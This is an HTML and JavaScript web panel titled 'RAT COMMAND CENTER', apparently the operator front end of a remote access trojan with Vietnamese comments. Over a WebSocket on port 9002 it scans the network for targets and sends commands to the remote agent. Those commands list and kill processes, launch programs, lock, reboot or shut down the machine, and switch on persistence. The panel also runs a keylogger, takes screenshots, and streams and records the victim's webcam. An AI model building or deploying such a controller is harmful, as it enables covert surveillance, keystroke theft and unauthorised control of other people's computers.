<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RAT COMMAND CENTER</title>
    
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">

    <style>
        :root {
            /* Palette Dark Mode cũ bạn thích */
            --bg-body: #1e1e20;
            --bg-panel: #2b2b2e;
            --bg-input: #38383b;
            --border-color: #444;
            --text-main: #e1e1e1;
            --text-muted: #b0b0b0;
            --accent: #3b82f6;      
            --success: #10b981;     
            --danger: #ef4444;      
            --warning: #f59e0b;
        }

        body {
            background-color: var(--bg-body);
            color: var(--text-main);
            font-family: 'Roboto', sans-serif;
            font-size: 14px;
        }

        /* --- Panel Styles --- */
        .glass-panel {
            background: var(--bg-panel);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            padding: 16px;
            margin-bottom: 20px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.2);
        }

        .panel-header {
            font-weight: 600;
            font-size: 0.85rem;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            border-bottom: 1px solid var(--border-color);
            padding-bottom: 10px;
            margin-bottom: 15px;
            color: var(--accent);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        /* --- Terminal --- */
        .terminal {
            font-family: 'JetBrains Mono', monospace;
            background-color: #151517;
            border: 1px solid var(--border-color);
            border-radius: 4px;
            padding: 8px;
            color: #d4d4d4;
            font-size: 0.75rem;
            overflow-y: auto;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        
        #process-list-output { height: 300px; color: #81a1c1; border-left: 2px solid var(--accent); }
        #keylog-output { height: 220px; color: #a3be8c; border-left: 2px solid var(--success); }

        .process-item { padding: 2px 0; border-bottom: 1px solid #333; display: flex; justify-content: space-between; }
        .process-name { font-weight: bold; color: #e1e1e1; }
        .process-pid { color: #888; }

        /* --- Inputs & Buttons --- */
        .form-control, .form-select {
            background-color: var(--bg-input);
            border: 1px solid var(--border-color);
            color: #fff;
            font-size: 0.85rem;
        }
        .form-control:focus, .form-select:focus {
            background-color: #454548;
            border-color: var(--accent);
            color: #fff;
            box-shadow: none;
        }
        .form-control::placeholder { color: #888; opacity: 1; }

        .btn-sm { font-size: 0.75rem; padding: 0.3rem 0.6rem; }
        
        /* --- Media --- */
        .media-container {
            background: #000;
            border: 1px solid var(--border-color);
            border-radius: 4px;
            min-height: 240px;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            margin-top: 10px;
        }
        #webcam-feed { width: 100%; object-fit: contain; }

        /* --- Toast Notification --- */
        #toast-box {
            position: fixed; top: 20px; right: 20px; z-index: 9999;
            background: #2b2b2e; border-left: 4px solid; color: #fff;
            padding: 12px 16px; border-radius: 4px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.5);
            display: none; font-size: 0.85rem; font-weight: 500;
        }
        .label-text { font-size: 0.7rem; color: var(--text-muted); margin-bottom: 4px; display: block; font-weight: 600; }
        
        .scanning-spinner { display: none; }
    </style>
</head>
<body>

    <div class="container-fluid border-bottom border-secondary py-2 mb-4" style="background: #232326;">
        <div class="container d-flex justify-content-between align-items-center">
            <h6 class="m-0 text-white font-monospace"><i class="fas fa-terminal me-2 text-accent"></i>RAT PANEL</h6>
            
            <div class="d-flex align-items-center gap-2">
                <button class="btn btn-warning btn-sm fw-bold" onclick="scanNetwork()" id="btn-scan">
                    <i class="fas fa-search"></i> SCAN
                    <span class="spinner-border spinner-border-sm scanning-spinner" role="status"></span>
                </button>

                <select class="form-select form-select-sm" id="server-select" style="width: auto; min-width: 150px;">
                    <option value="" selected>-- Target --</option>
                    <option value="127.0.0.1">Localhost</option>
                </select>
                
                <input type="text" id="manual-ip" class="form-control form-control-sm" placeholder="Or Type IP" style="width: 120px;" onkeypress="handleEnter(event, 'connect')">
                
                <button class="btn btn-primary btn-sm" onclick="connectFromSelection()"><i class="fas fa-plug"></i></button>
                <span id="conn-status" class="badge bg-danger" style="font-size: 0.7rem;">OFFLINE</span>
            </div>
        </div>
    </div>

    <div id="toast-box"></div>

    <div class="container">
        <div class="row">
            <div class="col-lg-5">
                <div class="glass-panel">
                    <div class="panel-header">
                        <span><i class="fas fa-server"></i> System</span>
                        <button class="btn btn-link btn-sm p-0 text-decoration-none" style="color: var(--accent);" onclick="sendCommand('LIST_PROC')"><i class="fas fa-sync-alt"></i> Refresh</button>
                    </div>

                    <div id="process-list-output" class="terminal mb-3">
                        <div class="text-center text-muted mt-5">Ready to scan...</div>
                    </div>

                    <div class="row g-2 mb-2">
                        <div class="col-9">
                            <span class="label-text">TERMINATE PROCESS</span>
                            <input type="text" id="pid-input" class="form-control form-control-sm" placeholder="PID / Name" onkeypress="handleEnter(event, 'kill')">
                        </div>
                        <div class="col-3 d-flex align-items-end">
                            <button class="btn btn-outline-danger btn-sm w-100" onclick="killProcess()">Kill</button>
                        </div>
                    </div>

                    <div class="row g-2 mb-4">
                        <div class="col-9">
                            <span class="label-text">EXECUTE APPLICATION</span>
                            <input type="text" id="app-input" class="form-control form-control-sm" placeholder="App Name / URL" onkeypress="handleEnter(event, 'start')">
                        </div>
                        <div class="col-3 d-flex align-items-end">
                            <button class="btn btn-outline-success btn-sm w-100" onclick="startApp()">Run</button>
                        </div>
                    </div>

                    <span class="label-text">POWER CONTROL</span>
                    <div class="d-flex gap-2 mb-2">
                        <button class="btn btn-secondary btn-sm flex-grow-1" onclick="sendCommand('SYSTEM_CONTROL', {type: 'LOCK'})"><i class="fas fa-lock"></i> Lock</button>
                        <button class="btn btn-secondary btn-sm flex-grow-1" onclick="sendCommand('SYSTEM_CONTROL', {type: 'RESTART'})"><i class="fas fa-redo"></i> Reboot</button>
                        <button class="btn btn-secondary btn-sm flex-grow-1" onclick="sendCommand('SYSTEM_CONTROL', {type: 'SHUTDOWN'})"><i class="fas fa-power-off"></i> Off</button>
                    </div>
                    
                    <div class="d-flex gap-2 mb-3">
                        <button class="btn btn-dark btn-sm flex-grow-1 border border-secondary" onclick="sendCommand('PERSISTENCE', {mode: 'ON'})" title="Auto-Start"><i class="fas fa-check"></i> Persist ON</button>
                        <button class="btn btn-dark btn-sm flex-grow-1 border border-secondary" onclick="sendCommand('PERSISTENCE', {mode: 'OFF'})"><i class="fas fa-times"></i> Persist OFF</button>
                    </div>

                    <button class="btn btn-danger w-100 btn-sm" style="opacity: 0.8;" onclick="killServer()"><i class="fas fa-skull"></i> KILL SERVER</button>
                </div>
            </div>

            <div class="col-lg-7">
                <div class="glass-panel">
                    <div class="panel-header">
                        <span><i class="fas fa-keyboard"></i> Keylogger</span>
                        <div class="form-check form-switch">
                            <input class="form-check-input" type="checkbox" id="keylogSwitch" onchange="toggleKeylogger(this.checked)">
                            <label class="form-check-label small" for="keylogSwitch">Monitor</label>
                        </div>
                    </div>
                    <div id="keylog-output" class="terminal">_</div>
                </div>

                <div class="glass-panel">
                    <div class="panel-header">
                        <span><i class="fas fa-eye"></i> Visual</span>
                        <span id="stream-status" class="badge bg-secondary" style="font-size: 0.65rem;">IDLE</span>
                    </div>

                    <div class="row g-2 mb-2">
                        <div class="col-4">
                            <button class="btn btn-primary btn-sm w-100" onclick="sendCommand('SCREENSHOT')"><i class="fas fa-camera"></i> Snap</button>
                        </div>
                        <div class="col-4">
                            <button id="btn-stream" class="btn btn-outline-success btn-sm w-100" onclick="toggleWebcam()">
                                <i class="fas fa-video"></i> Stream
                            </button>
                        </div>
                        <div class="col-4">
                            <button class="btn btn-outline-warning btn-sm w-100" onclick="startRecord()"><i class="fas fa-record-vinyl"></i> Rec 10s</button>
                        </div>
                    </div>
                    
                    <div class="media-container">
                        <img id="webcam-feed" alt="" style="display:none;">
                        <div id="media-placeholder" class="text-muted small">
                            <i class="fas fa-video-slash fa-2x mb-2"></i><br>NO SIGNAL
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        const wsUrlTemplate = "{{ ws_url }}"; 
        let ws;
        let isKeylogging = false;
        let isStreaming = false; 
        const toastBox = document.getElementById('toast-box');

        // --- UI UTILS ---
        function showToast(msg, type='info') {
            toastBox.textContent = msg;
            toastBox.style.borderLeftColor = type === 'success' ? 'var(--success)' : (type === 'error' ? 'var(--danger)' : 'var(--accent)');
            toastBox.style.display = 'block';
            setTimeout(() => toastBox.style.display = 'none', 3000);
        }

        // --- [NEW] SCANNER LOGIC ---
        async function scanNetwork() {
            const btn = document.getElementById('btn-scan');
            const spinner = document.querySelector('.scanning-spinner');
            const select = document.getElementById('server-select');
            
            btn.disabled = true; spinner.style.display = 'inline-block';
            showToast("Scanning Network...", "info");

            try {
                const response = await fetch('/api/scan');
                const servers = await response.json();
                
                select.innerHTML = '<option value="">-- Select Target --</option><option value="127.0.0.1">Localhost</option>';
                
                if (servers.length > 0) {
                    servers.forEach(srv => {
                        const opt = document.createElement('option');
                        opt.value = srv.ip;
                        opt.text = `${srv.name} (${srv.ip})`;
                        select.add(opt);
                    });
                    showToast(`Found ${servers.length} Servers!`, "success");
                    select.selectedIndex = 2; // Auto select first found
                } else {
                    showToast("No servers found (check firewall).", "error");
                }
            } catch (e) {
                console.error(e); showToast("Scan failed.", "error");
            } finally {
                btn.disabled = false; spinner.style.display = 'none';
            }
        }

        function connectFromSelection() {
            const selectIp = document.getElementById('server-select').value;
            const manualIp = document.getElementById('manual-ip').value.trim();
            const finalIp = manualIp || selectIp;

            if (!finalIp) return showToast("Select or Type IP!", "error");
            connectWebSocket(`ws://${finalIp}:9002`);
        }

        function downloadFile(b64, name, mime) {
            const a = document.createElement('a');
            a.href = `data:${mime};base64,${b64}`; a.download = name; a.click();
        }

        function handleEnter(e, action) {
            if(e.key === 'Enter') {
                e.preventDefault();
                if(action === 'kill') killProcess();
                else if(action === 'start') startApp();
                else if(action === 'connect') connectFromSelection();
            }
        }

        // --- WEBSOCKET ---
        function connectWebSocket(url) {
            if(ws) ws.close();
            ws = new WebSocket(url);
            
            ws.onopen = () => {
                document.getElementById('conn-status').textContent = 'CONNECTED';
                document.getElementById('conn-status').className = 'badge bg-success';
                showToast("Connected to " + url, "success");
            };
            
            ws.onclose = () => {
                document.getElementById('conn-status').textContent = 'DISCONNECTED';
                document.getElementById('conn-status').className = 'badge bg-danger';
                isKeylogging = false; document.getElementById('keylogSwitch').checked = false;
                updateWebcamUI(false);
            };

            ws.onerror = () => showToast("Connection Fail", "error");

            ws.onmessage = (event) => {
                const data = JSON.parse(event.data);

                if (data.type === 'LIST_RESULT') {
                    let html = '';
                    data.data.forEach(p => {
                        let parts = p.split(' | ');
                        html += `<div class="process-item">
                                    <span class="process-name">${parts[0]}</span> 
                                    <span class="process-pid">${parts[1]}</span>
                                 </div>`;
                    });
                    document.getElementById('process-list-output').innerHTML = html;
                    showToast(`Loaded ${data.data.length} tasks.`, "success");
                }
                else if (data.type === 'ACTION_RESULT') {
                    showToast(data.msg, data.msg.includes("THẤT BẠI") ? "error" : "success");
                    if(data.msg.includes("Stopping") || data.msg.includes("dung Webcam")) updateWebcamUI(false);
                }
                else if (data.type === 'KEYLOG_RESULT') {
                    const out = document.getElementById('keylog-output');
                    let clean = data.data.replace(/\[ENTER\]/g, '\n');
                    out.innerHTML += clean; out.scrollTop = out.scrollHeight;
                    if(isKeylogging) sendCommand('GET_KEYLOG');
                }
                else if (data.type === 'CAM_FRAME') {
                    document.getElementById('webcam-feed').src = 'data:image/jpeg;base64,' + data.data;
                    if(!isStreaming) updateWebcamUI(true);
                }
                else if (data.type === 'SCREENSHOT_RESULT' || data.type === 'RECORD_RESULT') {
                    const ext = data.type === 'RECORD_RESULT' ? 'avi' : 'jpg';
                    downloadFile(data.data, `data_${Date.now()}.${ext}`, ext === 'avi' ? 'video/avi' : 'image/jpeg');
                    showToast("Download started.", "success");
                }
            };
        }

        function sendCommand(cmd, args={}) {
            if(ws && ws.readyState === 1) { args.cmd = cmd; ws.send(JSON.stringify(args)); }
            else showToast("No Connection", "error");
        }

        // --- COMMANDS ---
        function killProcess() {
            const val = document.getElementById('pid-input').value.trim();
            if(val) { sendCommand('KILL_PROC', isNaN(val) ? {proc_name: val} : {pid: val}); document.getElementById('pid-input').value = ''; }
        }

        function startApp() {
            const val = document.getElementById('app-input').value.trim();
            if(val) { sendCommand('START_PROC', {name: val}); document.getElementById('app-input').value = ''; }
        }

        function toggleKeylogger(state) {
            isKeylogging = state;
            if(state) { sendCommand('START_KEYLOG'); sendCommand('GET_KEYLOG'); showToast("Monitoring...", "success"); }
            else showToast("Monitor Paused.");
        }

        function toggleWebcam() {
            if(!isStreaming) { sendCommand('START_CAM'); showToast("Starting Stream...", "info"); }
            else { sendCommand('STOP_CAM'); }
        }

        function updateWebcamUI(active) {
            isStreaming = active;
            const btn = document.getElementById('btn-stream');
            const status = document.getElementById('stream-status');
            const img = document.getElementById('webcam-feed');
            const placeholder = document.getElementById('media-placeholder');

            if(active) {
                btn.className = 'btn btn-danger btn-sm w-100';
                btn.innerHTML = '<i class="fas fa-stop"></i> Stop';
                status.textContent = "LIVE"; status.className = "badge bg-danger blink";
                img.style.display = 'block'; placeholder.style.display = 'none';
            } else {
                btn.className = 'btn btn-outline-success btn-sm w-100';
                btn.innerHTML = '<i class="fas fa-video"></i> Stream';
                status.textContent = "IDLE"; status.className = "badge bg-secondary";
                img.style.display = 'none'; placeholder.style.display = 'block';
                img.src = "";
            }
        }

        function startRecord() {
            if(isStreaming) showToast("Stop Stream first!", "error");
            else { sendCommand('RECORD_CAM'); showToast("Recording...", "info"); }
        }

        function killServer() {
            if(confirm("Terminate Remote Server?")) sendCommand('KILL_SERVER');
        }

        // Auto connect
        connectManual();
    </script>
</body>
</html>